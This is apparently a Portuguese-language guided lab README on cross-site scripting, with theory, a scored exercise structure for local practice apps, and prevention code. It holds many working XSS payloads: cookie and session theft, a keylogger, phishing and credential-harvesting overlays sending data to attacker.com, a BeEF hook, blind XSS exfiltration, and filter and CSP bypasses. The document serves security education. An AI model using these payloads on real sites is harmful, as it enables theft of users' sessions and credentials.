# ⚡ Cross-Site Scripting (XSS) - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟢 Iniciante → 🔴 Avançado
**Tempo estimado**: 4-6 horas
**Pontos**: 90 (10 + 30 + 50)

### O Que Você Vai Aprender

✅ Fundamentos de XSS (Reflected, Stored, DOM-based)
✅ Bypass de sanitização e filtros
✅ XSS em diferentes contextos (HTML, JavaScript, CSS, JSON)
✅ Exploits reais (cookie stealing, keylogging, phishing, defacement)
✅ Polyglot payloads
✅ Content Security Policy (CSP) bypass
✅ Técnicas de encoding

---

## 📖 Teoria Completa

### O Que É XSS?

Cross-Site Scripting (XSS) é uma vulnerabilidade que permite que atacantes injetem código JavaScript malicioso em páginas web visualizadas por outros usuários.

### Como Funciona?

#### Código Vulnerável Clássico

```python
# VULNERÁVEL ❌
search_query = request.args.get('q')
return f"<p>Você buscou por: {search_query}</p>"
```

**Input normal:**
```
?q=laptop
Output: <p>Você buscou por: laptop</p>
```

**Input malicioso:**
```
?q=<script>alert('XSS')</script>
Output: <p>Você buscou por: <script>alert('XSS')</script></p>
```

O JavaScript é executado no navegador da vítima!

---

## 🎯 Tipos de XSS

### 1. Reflected XSS (Refletido)

**Características:**
- Payload vem da requisição (URL, formulário)
- Executado imediatamente na resposta
- Não é armazenado no servidor
- Requer que vítima clique em link malicioso

**Exemplo:**
```
http://site.com/search?q=<script>alert(document.cookie)</script>
```

**Fluxo:**
```
Atacante → Link malicioso → Vítima clica → Servidor reflete → XSS executa
```

### 2. Stored XSS (Armazenado)

**Características:**
- Payload é armazenado no servidor (banco de dados)
- Executado toda vez que a página é carregada
- Afeta múltiplos usuários
- Mais perigoso que Reflected

**Exemplo:**
```
Comentário: "Ótimo produto! <script>/* payload malicioso */</script>"
↓ Armazenado no banco
↓ Exibido para todos os usuários
↓ XSS executa para cada visitante
```

**Locais comuns:**
- Comentários em blogs
- Reviews de produtos
- Perfis de usuários
- Mensagens em fóruns
- Tickets de suporte

### 3. DOM-based XSS

**Características:**
- Vulnerabilidade está no JavaScript client-side
- Servidor nunca vê o payload
- Manipulação do DOM pelo JavaScript

**Exemplo vulnerável:**
```javascript
// VULNERÁVEL ❌
var search = location.search.substring(1);
document.getElementById('result').innerHTML = search;
```

**Exploit:**
```
?q=<img src=x onerror=alert('XSS')>
```

---

## 💣 Payloads Básicos

### 1. Alert Box (Proof of Concept)

```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(1)</script>
```

### 2. Cookie Stealing

```html
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```

### 3. Keylogger

```html
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?k=' + e.key);
}
</script>
```

### 4. Phishing

```html
<script>
document.body.innerHTML = '<h1>Sessão Expirada</h1><form action="https://attacker.com/phish"><input name="password" type="password"><button>Login</button></form>';
</script>
```

### 5. Redirecionamento

```html
<script>window.location='https://attacker.com'</script>
<meta http-equiv="refresh" content="0;url=https://attacker.com">
```

---

## 🔓 Bypass de Sanitização

### 1. Nested Tags

Se o filtro remove `<script>`:
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

Após sanitização: `<script>alert(1)</script>` ✓

### 2. Event Handlers

Quando `<script>` é bloqueado:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<details ontoggle=alert(1) open>
<video><source onerror=alert(1)>
```

### 3. Case Variation

```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</ScRiPt>
```

### 4. Encoding

```html
<!-- HTML Entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- JavaScript Unicode -->
<script>\u0061lert(1)</script>

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Hex -->
<script>eval('\x61lert(1)')</script>
```

### 5. Alternative Tags

```html
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<a href="javascript:alert(1)">Click</a>
```

---

## 🎭 XSS em Diferentes Contextos

### 1. Contexto HTML

```html
<!-- Injeção direta -->
<p>User input here</p>
Payload: <script>alert(1)</script>
```

### 2. Contexto de Atributo HTML

```html
<!-- Valor de atributo -->
<input value="USER_INPUT">
Payload: "><script>alert(1)</script>
Ou: " autofocus onfocus=alert(1) x="
```

### 3. Contexto JavaScript

```html
<script>
var name = 'USER_INPUT';
</script>

Payload: '; alert(1); //
Payload: '-alert(1)-'
```

### 4. Contexto de URL

```html
<a href="USER_INPUT">Link</a>
Payload: javascript:alert(1)
Payload: data:text/html,<script>alert(1)</script>
```

### 5. Contexto CSS

```html
<style>
body { background: USER_INPUT; }
</style>

Payload: red; } </style><script>alert(1)</script><style>
Payload: expression(alert(1))  /* IE only */
```

### 6. Contexto JSON

```javascript
var data = {"name": "USER_INPUT"};
Payload: ", "admin": true, "foo": "
```

---

## 🛡️ Content Security Policy (CSP)

### O Que É CSP?

Header HTTP que restringe fontes de recursos:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### Bypass de CSP

#### 1. JSONP Endpoints

Se `script-src` permite domínio externo:
```html
<script src="https://allowed-domain.com/jsonp?callback=alert"></script>
```

#### 2. AngularJS Sandbox Bypass

```html
{{constructor.constructor('alert(1)')()}}
```

#### 3. Base Tag Injection

```html
<base href="https://attacker.com/">
<script src="/legit-script.js"></script>
<!-- Carrega de attacker.com/legit-script.js -->
```

---

## 🚀 Exploits Avançados

### 1. BeEF (Browser Exploitation Framework)

```html
<script src="http://attacker.com:3000/hook.js"></script>
```

Permite:
- Controle do navegador
- Keylogging
- Screenshots
- Network scanning
- Module injection

### 2. Self-XSS to Stored XSS

```javascript
// Vítima executa no console (self-XSS)
fetch('/api/profile', {
  method: 'POST',
  body: JSON.stringify({bio: '<script>/* malicious */</script>'})
});
// Agora é Stored XSS afetando outros!
```

### 3. Mutation XSS (mXSS)

```html
<!-- Input sanitizado -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Após parse do navegador -->
<noscript><p title="</noscript>
<img src=x onerror=alert(1)>">
```

### 4. Blind XSS

Payload executado em painel admin não visível:
```html
<script src="https://attacker.com/blind.js"></script>
```

`blind.js`:
```javascript
fetch('https://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,
    localStorage: localStorage,
    dom: document.body.innerHTML
  })
});
```

---

## 📚 Payloads por Categoria

### Cookie Stealing

```html
<script>new Image().src='http://attacker.com/?c='+document.cookie;</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### Session Hijacking

```javascript
fetch('http://attacker.com/hijack', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: Object.entries(localStorage),
    sessionStorage: Object.entries(sessionStorage)
  })
});
```

### Defacement

```html
<script>
document.body.innerHTML = '<h1 style="color:red">HACKED BY ATTACKER</h1>';
</script>
```

### Credential Harvesting

```html
<script>
var div = document.createElement('div');
div.innerHTML = '<h3>Sessão Expirada</h3><form><input name="user"><input name="pass" type="password"><button>Login</button></form>';
div.style = 'position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;';
div.querySelector('form').onsubmit = function(e) {
  e.preventDefault();
  fetch('http://attacker.com/creds?u='+this.user.value+'&p='+this.pass.value);
  alert('Login falhou. Tente novamente.');
};
document.body.appendChild(div);
</script>
```

### Port Scanning

```javascript
var ports = [80, 443, 8080, 3000, 5000];
ports.forEach(port => {
  fetch('http://192.168.1.1:' + port)
    .then(() => console.log('Port ' + port + ' open'))
    .catch(() => console.log('Port ' + port + ' closed'));
});
```

---

## 🔧 Ferramentas

### 1. XSS Hunter

```html
<script src="https://xss.hunter.example.com/c/YOUR_ID"></script>
```

### 2. XSSer

```bash
xsser --url "http://target.com/search?q=XSS" --auto
```

### 3. Burp Suite

- Intruder com payloads XSS
- Scanner automático
- Decoder para encoding

### 4. XSStrike

```bash
python3 xsstrike.py -u "http://target.com/search?q=test"
```

---

## 🛡️ Prevenção

### 1. Output Encoding (CORRETO)

```python
from html import escape

# CORRETO ✅
search = escape(request.args.get('q', ''))
return f"<p>Você buscou por: {search}</p>"
```

### 2. Content Security Policy

```python
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

### 3. HTTPOnly Cookies

```python
response.set_cookie('session', value, httponly=True, secure=True, samesite='Strict')
```

### 4. Input Validation

```python
import re

def validate_input(text):
    # Permite apenas alfanuméricos e alguns caracteres
    if not re.match(r'^[a-zA-Z0-9\s\-_.,!?]+$', text):
        raise ValueError("Invalid input")
    return text
```

### 5. Template Engines Seguros

```python
# Jinja2 auto-escapes por padrão
from flask import render_template

# CORRETO ✅
return render_template('search.html', query=search_query)
```

### 6. Sanitização (Biblioteca)

```python
import bleach

# Remove todas as tags exceto permitidas
clean = bleach.clean(
    user_input,
    tags=['b', 'i', 'u', 'em', 'strong'],
    attributes={},
    strip=True
)
```

---

## 🎯 Estrutura do Laboratório

### 1. 🟢 Basic App (10 pontos)
- **Porta**: 5020
- **Cenário**: Blog simples
- Reflected XSS em search
- Stored XSS em comments
- Sem filtros

### 2. 🟡 Intermediate App (30 pontos)
- **Porta**: 5021
- **Cenário**: Rede social
- XSS em múltiplos contextos
- Filtros básicos (bypassáveis)
- DOM-based XSS
- Cookie com dados sensíveis

### 3. 🔴 Advanced App (50 pontos)
- **Porta**: 5022
- **Cenário**: Plataforma corporativa
- CSP implementado
- Múltiplas camadas de sanitização
- Blind XSS em tickets
- JSON XSS
- Mutation XSS

---

## 📝 Checklist de Conclusão

- [ ] Entendi os 3 tipos de XSS
- [ ] Executei Reflected XSS básico
- [ ] Executei Stored XSS
- [ ] Bypassei filtro com nested tags
- [ ] Bypassei filtro com event handlers
- [ ] Executei cookie stealing
- [ ] Criei keylogger funcional
- [ ] Explorei DOM-based XSS
- [ ] Bypassei CSP
- [ ] Completei todos os exercícios

**Total**: 90 pontos

---

## 🎓 Próximos Passos

Após dominar XSS:

1. **DOM Clobbering**
2. **Prototype Pollution**
3. **XSS em aplicações modernas (React, Angular, Vue)**
4. **XSLeaks**

**Próximo Lab**: [03 - Broken Access Control →](../03-access-control/README.md)

---

**Boa sorte e happy hacking! ⚡**
